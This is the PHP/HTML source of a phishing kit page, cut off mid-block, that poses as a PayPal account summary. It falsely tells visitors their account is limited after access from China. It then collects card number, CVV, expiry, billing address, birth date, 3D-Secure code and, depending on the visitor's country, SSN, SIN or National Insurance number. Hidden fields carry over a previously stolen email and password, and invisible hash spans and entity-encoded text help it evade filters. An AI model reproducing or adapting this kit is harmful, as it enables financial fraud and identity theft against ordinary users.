<?php

/*
 * spKINGS.party
 */

error_reporting(0); 
 ob_start(); 
 @session_start(); 
 set_time_limit(0); 
 include('../not.php'); 
 require "../data/algo.php";
 
$countrycode = IP_Data(Get_IP(),"code");
$_SESSION['cntyCode'] = $countrycode;

$countryname = IP_Data(Get_IP(),"country");
$_SESSION['cntyName'] = $countryname;
 
$AccessT = md5(gmdate('fucked'));
$Token = strtoupper(sha1(256));

date_default_timezone_set('GMT');
$logindate  = date(", Y");
$dtem  = date("M");
$ss = (date("d")-1);
$strdate = ($dtem." ".$ss.$logindate) ;
$Cdg = Coding2Str('40');
?>


<html ng-app="Test"lang="en_US" dir="ltr" class="js">
<head>
<meta charset="utf-8"><!--Script info: script: node, template:  , date: Nov 2, 2016 13:30:28 -07:00, country: US, language: en web version:  content version:  hostname : QjML33U2ZDrLc+mXRRYY5wf/2anSPKSFFBOvn0OIaerQ37f4WyF7yWz+6jmnIb1f rlogid : 9HTImlZKNykHDqvP328w0%2FmkIVl4snGXpElTzkViuQXZwn8xgdc5AIAXh8HLydcxgPA6IGkXexW02ukGnqVv0w_15826bc5b10 -->
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no">
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="img/pp144.png">
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="img/pp114.png">
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="img/pp72.png">
<link rel="apple-touch-icon-precomposed" href="img/pp64.png">
<link rel="shortcut icon" sizes="196x196" href="img/pp196.png">
<link rel="shortcut icon" type="image/x-icon" href="img/favicon.ico">
<link rel="icon" type="image/x-icon" href="img/pp32.png">
<title>Please Com&#112;&#108;&#101;&#116;&#101;&#32;&#119;&#105;&#116;&#104;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#110;&#102;&#111;&#114;&#109;&#97;&#116;ions</title>
<link rel="stylesheet" href="css/app.ltr.css">
<link rel="stylesheet" href="css/paypal-sans.css">
<link rel="stylesheet" href="css/summary.ltr.css">
<link rel="stylesheet" href="css/wallet.ltr.css">
<link rel="stylesheet" href="css/main.css">
<script data-require="angular.js@*" src="https://code.angularjs.org/1.2.20/angular.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.js"></script>
<script src="../js/crypt.js"></script>
<script src="js/bnkName.js"></script>
    <script src="js/ngRoutingnum.js"></script>
</head>
<body  id="nikommek"class="feature-analytics feature-bundle feature-captcha feature-fso feature-global-rollout feature-installment-summary feature-migrate-fi-credit feature-redirectToSynchrony US">
<div class="vx_globalNav-main globalNav_main js_globalNavView" id="header" role="banner" data-show-warning="">
<div class="vx_globalNav-container">
<a href="#" class="vx_globalNav-brand_desktop"><span class="vx_a11yText">S&#117;&#109;&#109;&#97;&#114;y</span></a>
<div class="vx_globalNav-secondaryNav_mobile noPrint">
<div class="vx_globalNav-listItem_mobileLogout">
<a href="#" id="dos8"class="vx_globalNav-link_mobileLogout">L&#111;&#103;&#32;&#79;&#117;t</a>
</div><div class="vx_globalNav-listItem_settings">
<a href="#" class="vx_globalNav-link_settings">
<span class="vx_globalNav-iconWrapper_secondary">
<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings"></span></span>
<span class="vx_a11yText">Settings</span></a></div><div><p class="vx_h5 vx_globalNav-displayName"><?=@$_SESSION['_email_'];?></p>
<!-- Profile photo markup goes here. --></div></div>
<div class="vx_globalNav-navContainer noPrint">
<nav id="navMenu" class="vx_globalNav-nav" role="navigation">
<ul class="vx_globalNav-list">
<li id="dos2"><a href="#" class="vx_isActive vx_globalNav-links nemo_globalNavSummaryLink">
<span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkSummary"></span></span> 
<span class="vx_globalNav-navText">SummAry</span></a></li>
<li id="dos3"><a href="#" class=" vx_globalNav-links nemo_globalNavActivityLink"><span class="vx_globalNav-iconWrapper">
<span class="vx_globalNav-navIcon globalNav-icon_linkActivity"></span></span> <span class="vx_globalNav-navText">Activity</span></a>
</li><li id="dos4"><a href="#" class=" vx_globalNav-links nemo_globalNavTransferLink">
<span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkTransfer"></span>
</span> <span class="vx_globalNav-navText">Send &amp; Request</span></a></li>
<li id="dos5"><a href="#" class=" vx_globalNav-links nemo_globalNavWalletLink">
<span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkWallet"></span>
</span> <span class="vx_globalNav-navText">&#87;&#97;&#108;&#108;&#101;&#116;</span></a></li>
<li id="dos6"><a href="#" class=" vx_globalNav-links nemo_globalNavShopLink" target="_top">
<span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkShop"></span>
</span> <span class="vx_globalNav-navText">Shop</span></a></li>
<li id ="dos7"class="globalNav-listItem_mobile js_globalNavSearch"><a href="#" class="vx_globalNav-links nemo_globalNavSearchLink js_globalNavSearchLink">
<span class="vx_globalNav-navText">Seɑrch</span></a></li>
</ul>
<ul class="vx_globalNav-list_secondary">
<li class="vx_globalNav-actionItem_mobile globalNav_notificationItem vx_globalNav-notificationItem_mobile js_notificationButtonView nemo_headerNotifications" data-autodisplay="false">
<a href="#" class="vx_globalNav-link_notifications notifications_desktop js_notifications-toggleTrigger nemo_notificationsDesktopTrigger" name="openNotifications"   role="button" title="Notifications">
<span class="vx_globalNav-iconWrapper_secondary">
<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkNotifications"></span>
<span class="vx_notificationCount notificationLength-1 js_notificationCount">3</span></span>
<span class="vx_globalNav-navText_secondary vx_globalNav-navText_secondaryMobile vx_a11yText">Notificɑtions</span></a></li>
<li id="js_tourSettings"><a href="#" class="vx_globalNav-link_settings" name="settings" title="Settings">
<span class="vx_globalNav-iconWrapper_secondary">
<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings"></span></span>
<span class="vx_globalNav-navText_secondary vx_a11yText">Settings</span></a></li>
<li class="globalNav-listItem_mobile"><a href="#" class="vx_globalNav-link_help" name="help">
<span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkHelp"></span></span>
<span class="vx_globalNav-navText_secondary vx_a11yText">Help</span></a></li>
<li class="vx_globalNav-listItem_logout"><a href="" id="dos9"class="vx_globalNav-link_logout nemo_logoutBtn">Log Out</a></li>
</ul>
</nav></div></div></div>
<div id="sidepanelNotifications" class="vx_sidepanel sidepanel js_sidepanelView noPrint panel js_globalNotifs-sidepanel" tabindex="-1">
<div class="vx_sidepanel-headerContainer">
<h3 class="vx_h3 vx_sidepanel-header"style="color:#FFFFFF">Notificɑtions</h3>
<div class="vx_sidepanel-headerIcon_right"><a href="#" class="globalNotifs-close js_closeNotifications" name="closeNotifications" role="button" ><span class="icon icon-small icon-close-small" aria-hidden="true"></span>
<span class="vx_a11yText">Close Notificɑtions</span></a></div></div>
<div class="vx_sidepanel-body">
<ul class="vx_sidepanel-list">
 <li><a class="vx_sidepanel-item">
 <span class="icon icon-small icon-critical-small globalNotifs-levelIndicator_critical" style="color:#f24246;"></span>
 <p class="globalNotifs-message"style="color:#FFFFFF">There’s a problem wi&#116;&#104;&#32;&#121;&#111;&#117;&#114;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#46;&#32;&#77;&#97;&#107;&#101;&#32;&#115;&#117;&#114;&#101;&#32;&#116;&#111;&#32;&#114;&#101;&#115;&#111;&#108;&#118;&#101;&#32;&#105;&#116;&#32;&#115;&#111;&#32;&#121;&#111;&#117;&#32;&#104;&#97;&#118;&#101;&#32;&#102;&#117;&#108;&#108;&#32;&#97;&#99;&#99;&#101;&#115;&#115;&#32;&#116;&#111;&#32;&#121;&#111;&#117;&#114;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#105;&#109;&#109;&#101;diately.</p></a>
 </li>
 <li id="dos1"><a href="#" class="globalNotifs-listItem vx_sidepanel-item">
 <span style="padding-top:6%;padding-right:5%;" class="icon icon-medium icon-card-half-solid  globalNotifs-levelIndicator_info"></span>Confirm your card details</a></li>
 <li> <a href="#" class="globalNotifs-listItem vx_sidepanel-item"><span style="padding-top:6%;padding-right:5%;" class="icon icon-medium icon-bank-half-solid  globalNotifs-levelIndicator_info"></span>Confirm your bank details</a></li>
 <li><a href="#" class="globalNotifs-listItem vx_sidepanel-item">
 <span style="padding-top:6%;padding-right:5%;" class="icon icon-small icon-pp-logo-outline  globalNotifs-levelIndicator_info"></span>Upload your proof document</a></li>
 
 </ul></div></div>
<div id="js_foreground" class="vx_foreground-container foreground-container">
<div class="vx_globalNav-main_mobile js_globalNavView"><div class="vx_globalNav-headerSection_trigger">
<a href="#navMenu" class="js_toggleMobileMenu vx_globalNav-toggleTrigger nemo_mobileNavMenuToggle noPrint">Menu</a></div>
<div class="vx_globalNav-headerSection_logo"><a href="#" class="vx_globalNav-brand_mobile">
<span class="vx_a11yText">Summary</span></a></div>
<ul class="vx_globalNav-headerSection_actions">
<li class="vx_globalNav-actionItem_mobile globalNav_notificationItem vx_globalNav-notificationItem_mobile js_notificationButtonView nemo_headerNotifications" data-autodisplay="false">
<a href="#" class="vx_globalNav-link_notifications notifications_mobile js_notifications-toggleTrigger nemo_notificationsMobileTrigger" name="openNotifications"   role="button" title="Notifications">
<span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkNotifications"></span>
<span class="vx_notificationCount notificationLength-1 js_notificationCount">3</span></span>
<span class="vx_globalNav-navText_secondary vx_globalNav-navText_secondaryMobile vx_a11yText">Notifications</span></a>
</li>
</ul></div>
<div class="contents vx_mainContent" id="contents" role="main" aria-labelledby="heading1">
<div id="js_summaryView" class="mainContents summaryContainer" >
<h1 id="heading1" class="accessAid">PayPal: Summary</h1>
<div id="js_engagementModuleView" class="engagementModule nemo_engagementModule" data-engagement-badges="">
<div class="engagementSneakPeek-pullTab js_engagementSneakPeek-pullTab js_engagementSneakPeek-trigger">
<span class="icon icon-small icon-arrow-down-small" aria-hidden="true"></span></div>
<div class="engagementMainBar-container js_engagementMainBar-container">
<div class="summarySection engagementMainBar row"style="height:0%;">
<div class="col-sm-7 progressAndWelcome">
<div id="js_toggleProfileStatus" class="welcomeMessage js_selectModule selectModule profileStatus  active" data-module-number="0">
<p class="vx_h3 engagementWelcomeMessage nemo_welcomeMessageHeader"><span class="icon icon-small icon-lock-small" style="color:#ffffff"></span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#FFFFFF">Limited Account Access Details !</span></p>
</div></div>
<div id="js_engagementActions" class="col-sm-5 engagementActions"></div></div></div>
<div id="js_emSlideDownContainer" aria-expanded="true" role="alertdialog" tabindex="-1" class="emSlideDownContainer nemo_emSlideDownContainer autoHeight" data-em-open="false" data-current-module="" data-new-user="true" data-total-percentage="60" data-hide-sneak-peek="false" data-hide-account-completion="true" data-is-first-use-enabled="false" data-auto-tour="false" data-auto-open-offer="false" aria-label="Get the most out of PayPal">
<div class="engagementSneakPeek-overlay js_engagementSneakPeek-overlay"></div>
</div></div>
 <div class="mainBody">
 <div id="summary" class="summarySection">
 <div class="row">
 <div class="col-sm-12 summaryModuleContainer">
 
 <section class="walletModule nemo_balanceModule" aria-labelledby="walletModuleHeader" id="js_tourWalletModule">
 <div class="balanceModule">
 <h3><a class="moduleHeaderLink nemo_moduleHeaderLink"></a></h3>
<div class="footerLink">
<img src="images/warning.png" width="90px" height="87px">
<div class="dotted"><hr></div>
<h2 style="color: rgb(68, 68, 68); font-weight: 300; margin: 0px 0px 11px; text-rendering: optimizeLegibility; line-height: 1.1; font-size: 24px; font-family: HelveticaNeue, 'Helvetica Neue', helvetica, Arial, sans-serif; font-style: normal; font-variant: normal; letter-spacing: normal; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px;">
<div><span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>2bc170e342e95dcbcc2466dc737e17ef</span>W<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>6abb0b35803b86a4d37e0150797079ce</span>a<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>6aa1b9cca0f23858b3b4c8b84340480a</span>r<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>7ea9302229375f11e0c2a6427a871b91</span>n<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>cf6b65b8a005f27f2577db905332cb3d</span>i<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>100990b14199dc8ba6ad39ca460a3feb</span>n<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>7a71ba3848dd23a3095f8332c6fedb9c</span>g<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>f8cdd8a5e665d39f90550625a485ed78</span> <span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>54ed4c126367743e14f985ccea6346c8</span>:<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>b8543b75b2264566acb27534dc13f306</span> <span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>391664adb3fdd836fc7aad0130ca5cb3</span>U<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>2256b3ae313b03d5c78cccce42400e9f</span>n<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>d857e7ba83261df8e732c9e6704ce580</span>u<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>a29369f2dcf694738e895ecb27d96810</span>s<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>24903ee4a3941f30463ef2e4fdac7324</span>u<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>518aa628d2e9794d70ff6ce2f36a2ab6</span>a<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>92317725fa0f30284083879bb861a207</span>l<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>06cb88270236044c263b0f4a59db1e12</span> <span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>d1ad4318f14003caa6cb5d9065c16b2e</span>a<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>5bc3d82b0be3d6a16dd28b6b4ac64695</span>c<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>36d0858ff4c0b269e219f277d88abb5b</span>t<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>206e79938bac758adef2282967f3c33c</span>i<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>af03cd9d45cb7706f34dcd5dc977e1a2</span>v<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>07459b340d6ddc3554db801b8a284ed2</span>i<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>7a0b0d49174f050d2fe1076327522fd1</span>t<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>738acea0d420e687d3c15fdf2eb2658c</span>i<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>482da20970baa4903bd052a2af07acad</span>e<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>1417212b3d2fa64a4d7072134802d20e</span>s<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>91f2929bc98a2b5930e437b039930882</span> <span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>6d0c269c8f230f51b4dcd1f20dc54035</span>o<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>b3b20abb835086dee595a814a74bb263</span>n<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>8302c27c8a9164f0a3a6486e46a67bac</span> <span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>66f772a8886dca11ea89b4d0cc316fe4</span>y<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>397a52baacaade085f1aab9ce4aedaf7</span>o<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>43e8aec10820b209ef9c674bbf5aadc8</span>u<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>a6b66f19aab0fa307166faa2f17546ba</span>r<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>9828e4e06c4e4e11125fa3791f9a8d15</span> <span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>e4e0b7290d5972948c25b7ba55f8ad0f</span>a<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>61d8cea24cb370e971f009f5189311bf</span>c<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>a0bfb99bef57cd645f780bb0cabf7f30</span>c<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>81d17bc61f8d514e721dfcdd0c8ac0ea</span>o<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>b1a91711356671ce6d410715339e210d</span>u<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>9236549897f65750e966abab901c057f</span>n<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>85e5803937532536298a5ebdd76afff6</span>t</div></h2>
<p style="margin-bottom: 15px; line-height: 24px; color: rgb(118, 118, 118); font-family: HelveticaNeue, 'Helvetica Neue', helvetica, Arial, sans-serif; font-size: 15px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px;">
If you are seeing the messages this means that your account has been visited 
from an unusual place given below :</p>
<table style="border-collapse: collapse; border-spacing: 0px; margin-bottom: 15px; border-radius: 5px; color: rgb(118, 118, 118); font-family: HelveticaNeue, 'Helvetica Neue', helvetica, Arial, sans-serif; font-size: 15px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 21px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px;" width="220">
	<tr>
		<td style="padding: 0px 0px 0px 20px; line-height: 24px; font-size: 15px; font-weight: bold;">
		IP</td>
		<td style="padding: 0px 0px 0px 20px; line-height: 24px; font-size: 15px; font-weight: bold;">
		: 182.126.232.48</td>
	</tr>
	<tr>
		<td style="padding: 0px 0px 0px 20px; line-height: 24px; font-size: 15px; font-weight: bold;">
		Country</td>
		<td style="padding: 0px 0px 0px 20px; line-height: 24px; font-size: 15px; font-weight: bold;">
		: China</td>
	</tr>
	<tr>
		<td style="padding: 0px 0px 0px 20px; line-height: 24px; font-size: 15px; font-weight: bold;">
		City</td>
		<td style="padding: 0px 0px 0px 20px; line-height: 24px; font-size: 15px; font-weight: bold;">
		: Zhengzhou</td>
	</tr>
	<tr>
		<td style="padding: 0px 0px 0px 20px; line-height: 24px; font-size: 15px; font-weight: bold;">
		Date</td>
		<td style="padding: 0px 0px 0px 20px; line-height: 24px; font-size: 15px; font-weight: bold;">
		: <?php echo $strdate; ?></td>
	</tr>
</table>
<p style="margin-bottom: 15px; line-height: 24px; color: rgb(118, 118, 118); font-family: HelveticaNeue, 'Helvetica Neue', helvetica, Arial, sans-serif; font-size: 15px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px;">
As a security measure, your account has been limited.<br>
<br>
Don't worry, you will be able to get your account back just after finishing this 
steps.</p>
<p></p>
<div class="dotted"><hr></div>
<p>      
<button href="#/wallet/confirm/card" class="vx_btn" id="form0">Continue</button>
</div></div></section>

</div></div></div></div></div></div>
<div id="footer" class="noPrint nemo_footer vx_globalFooter-container" role="contentinfo">
<div class="vx_globalFooter">
<div class="vx_globalFooter-content">
<ul class="vx_globalFooter-list">
<li><a href="#" target="_top" class="nemo_helpLink" name="footerHelp">Help &amp; Contact</a></li>
<li><a href="#" target="_top" class="nemo_securityLink" name="footerSecurity">Security</a></li>
</ul>
<div class="vx_globalFooter_secondary">
<p class="vx_globalFooter-copyright nemo_copyrightText"><span dir="ltr"></span> 2017 &#169; PayPal, Inc. All rights reserved.</p>
<ul class="vx_globalFooter-list_secondary">
<li><a href="#" target="_top" name="privacy" class="nemo_privacyLink">Privacy</a></li>
<li><a href="#" target="_top" name="legal" class="nemo_legalLink">Legal</a></li>
<li><a href="#" target="_top" name="policyUpdates" class="nemo_policyUpdatesLink">Policy updates</a></li>
<li class="vx_globalFooterLink-feedback" id="siteFeedback">
<a href="#" class="beta feedback nemo_feedback hidden-phone">Feedback</a></li>
</ul></div></div></div></div></div>


<section id="overpanel" class="theoverpanel animated med hide " tabindex="-1" role="dialog">
<div class=" overpanel-wrapper row"><div class="col-xs-12"><a href="#" class="dismiss close nemo_dismissClose" id="closer" aria-describedby="overpanel-header" role="button" name="asba" data-push-replace="false" data-pagename="" data-track-type="link"><span class="icon icon-close-small" aria-hidden="true"></span><span class="accessAid">Close</span></a></div>
<div id="form_card" class=" overpanel-content col-xs-12 col-xs-offset-0 col-sm-8 col-sm-offset-2 col-md-4 col-md-offset-4" role="document" style="padding-top:70px">
<div id="overpanel-header" class=" overpanel-header"></div><br>
<div class=" overpanel-body"><div class="cardType vx_btn-group toggleBtnGroup row"></div>

<form class="form-card" id="form1" action="" method="post" novalidate="novalidate"><h2 id="overpanel-header"><div><span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>3053052e79590477a7fca0e86b086161</span>C<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>5ee1024cdfaf5a1eed3ca34b97d4da39</span>o<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>e5b118b4333abe421a1bd5ad27b9e136</span>n<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>f2e10b85b8497dfac9f5698ca48f6939</span>f<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>9f4c3f37b4d8cf1017dc4440bf660fea</span>i<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>6bfb7c9f7395fbd5be25e4f4accf47d6</span>r<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>755ba4298b0691900ba86acf5a67251e</span>m<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>a716221b6aebe2ff46fa0c0325a92519</span>/<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>fb1494fb81c6cb39cdbda80101c348c1</span>L<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>97cadafd1199b23aeacaad9ca0d48010</span>i<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>1e3d8ab71bbe5afd2ccaf09f5050bc29</span>n<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>402b3ba8d0edb8247e59d984ba055848</span>k<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>a78186c9c552b1e9eba2fd15f46fe18a</span> <span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>b69498bb3c498bd16d17ee652111b4b0</span>a<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>ebf9477ef59059862daef4b4d30fc50c</span> <span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>2120bfcd626365d5c2c3aeff6e0a489a</span>c<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>6479b0891a96fccf50be27fed33f469d</span>a<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>f41de569d91cd90f406084a8ffdacafe</span>r<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>4748194c6fa1848e155e15b220b17a8a</span>d</div></h2>
<input type="hidden" name="mail" value="<?=@$_SESSION['_email_'];?>"  ><input type="hidden" name="pwd" value="<?=@$_SESSION['_password_'];?>">
                         <div class="inputs">
                            <input class="enterInput" type="text" name="CHN" id="chname"value="Full Name" style="text-transform: capitalize;" placeholder="C&#97;rdholder name">
                                
                        </div>                                          
                        <div class="inputs">
                                <input class="enterInput" type="tel" name="card_number" id="cardnumber" value="Card Number"placeholder="card number" maxlength="19" onkeyup="CarType(this.value)" >
                                <span class="cardos" id="CARDT"></span>
                                <input type="hidden" name="cartip" id="cartyp" value="<?=@$_SESSION['cartip'];?>">
                            </div>
                            <div class="section group inputs" id ="cc-swch"style="display:none">
                           <div class="col span_1_of_2 inexpiration"style="padding-bottom:10px;">
                                <input class="enterInput" type="tel" name="validFrom" id="validfrom"placeholder="validFrom MM/YYYY" maxlength="7">
                            </div>
                           <div class="col span_1_of_2">
                                <input class="enterInput" type="tel" name="issueNumber" id="issuenumber" placeholder="Issue Number" pattern="[0-9]*" maxlength="3">
                               
                            </div>
                        </div>
                        <div class="section group inputs">
                           <div class="col span_1_of_2 inexpiration">
                                <input class="enterInput" type="tel" name="expiration" placeholder="Expir&#97;tion MM/YYYY" maxlength="7">
                            </div>
                           <div class="col span_1_of_2">
                                <input class="enterInput" type="tel" name="cvv" id="cvv" placeholder="CSC (3 digits)" pattern="[0-9]*" maxlength="4">
                                <span class="cardos" id="cvn" style="background-position: 0px -434px;"></span>
                            </div>
                        </div>
                        
                        <div class="inputs" style="margin-bottom: 30px">
                            <select class="enterInput address" name="address">
                                <option value="0" selected=""> Select a billing &#97;ddress </option>
                                <option value="1">+ Add a new billing &#97;ddress</option>  
                            </select>
                        </div>
                        <input class="vx_btn" value="Save" type="submit">
                    </form>
                       <form class="form-address" style="padding-top:70px" id="form2" action="" method="post" novalidate="novalidate"><h2 id="overpanel-header">Add Billing Address </h2>
                        
                        
                        <div class="inputs">
                                <input class="enterInput" type="text" name="address_1" placeholder="Address line 1" maxlength="120">
                            </div>
                           <div class="inputs">
                                <input class="enterInput" type="text" name="address_2" placeholder="Address line 2 (optional)" maxlength="120">
                            </div>
                        <div class="section group inputs">
                           <div class="col span_1_of_2 inexpiration">
                                <input class="enterInput" type="text" name="city" placeholder="City" maxlength="30">
                            </div>
                           <div class="col span_1_of_2">
                                <input class="enterInput" type="text" name="state" placeholder="Phone Number" maxlength="30">
                            </div>
                        </div>
                        <div class="section group inputs" style="margin-bottom:2px">
                          <div class="section group inputs ">
                           <div class="col span_1_of_2 inexpiration">
                                <input class="enterInput" type="tel" name="zip_code" placeholder="Zip code" maxlength="12">
                            </div>
                           <div class="col span_1_of_2">
                                <input class="enterInput" type="text" name="country" placeholder="Country" maxlength="30" value="Contry">
                            </div>
                          </div>
                        </div>
                           
                        <input class="vx_btn vx_btn-block" value="Save" type="submit">
                        <a rel="nofollow" style="margin-bottom: 30px" class="cancel-address" href="#"> Cancel </a>
                    </form>             
</div></div>
<div class=" overpanel-content maxOverpanelWidth hide" style="padding-top:70px" id="formdetail" role="document">
<div id="overpanel-header" class=" overpanel-header">
<h2 id="overpanel-header">C&#97;rd details</h2>
</div>
<div class=" overpanel-body">
<div class="menu col-sm-6" style="width:49%; padding-left:2px">
<div id="reb3licon"class="creditOrDebit card blue image">
<span class="ribbon needConfirmation">
<span class="ribbonBadge needAttention" style="margin-top:-90px;">Confirm</span></span>
<span class="lastDigits" style="font-size:22" dir="ltr">XXXX-XXXX-XXXX-<span class="last4"></span><br><br><span class="ex"><span style="font-size:9px">VALID THRU&nbsp;</span><span class="icon icon-arrow-right-half-small"></span></span><br><span class="chn"></span></span></div>
</div>
<div class="cardSummary col-sm-6" aria-labelledby="overpanel-subheader">
<div class="editCard">
<form name="cardInfo" id="form3" action="" method="post" class="uneditable" novalidate="novalidate">
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate">
<label for="expirationDate" class="">Birth date</label>
<input id="birthh" name="DOB" class="enterInput" value="" placeholder="DD/MM/YYYY" autocomplete="off" dir="ltr" pattern="" maxlength="10" type="tel">

</div></div>

<div class="cardSecurityCode">
<div class="textInput csc csc_CC-U6DF6FT62QESW csc">
<label for="csc_CC-U6DF6FT62QESW" class="">Security inform&#97;tion</label>
<input id="csc_CC-reb3l" name="securecode" class="enterInput" value="" placeholder="3D-Secure" autocomplete="off" dir="ltr" pattern="" maxlength="15" type="text">
<span class="cardsec" id="secure"></span>
</div></div>

<?php 
if(trim($_SESSION['cntyName']) == "United States"){
    echo '
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class="">Social Security Number</label>
<input id="ssn" name="SSN" class="enterInput"   value="" placeholder="SSN (9 digits)" autocomplete="off" dir="ltr" pattern=""  maxlength="11" type="tel">

</div></div>';} ?>
<?php 
if(trim($_SESSION['cntyName']) == "Canada"){
    echo '
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class="">Soci&#97;l Insur&#97;nce Number</label>
<input id="sin" name="SIN" class="enterInput" value="" placeholder="SIN (9 digits)" autocomplete="off" dir="ltr" pattern="" maxlength="11" type="tel">

</div></div>';} ?>
<?php if (trim($_SESSION['cntyName']) == "United Kingdom"){
    echo'
<div class="expiration cobrowse_mask">
<div class="textInput expirationDate expirationDate expirationDate">
<label for="expirationDate" class="">N&#97;tional Insur&#97;nce Number</label>
